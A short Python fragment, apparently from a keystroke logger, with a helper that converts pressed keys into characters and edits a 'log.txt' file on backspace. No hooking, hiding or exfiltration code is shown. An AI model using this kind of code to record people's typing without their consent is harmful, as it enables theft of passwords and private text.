def key_convert(key):
    try:
        if 96 <= key.vk <= 105:
            data = chr(key.vk - 48)
        elif key.vk == 110:
            data = "."
        else:
            data = str(key).replace("'", "")

    except AttributeError:
        if str(key) == "Key.space":
            data = " "
        elif str(key) == "Key.enter":
            data = "\n"
        elif str(key) == "Key.backspace":
            with open('log.txt', 'r+') as file:
                content = file.read()
                if content:
                    file.seek(0)
                    file.write(content[:-1])
                    file.truncate()
            return
        else:
            #data = str(key).replace("'", "")
            data = None
    return data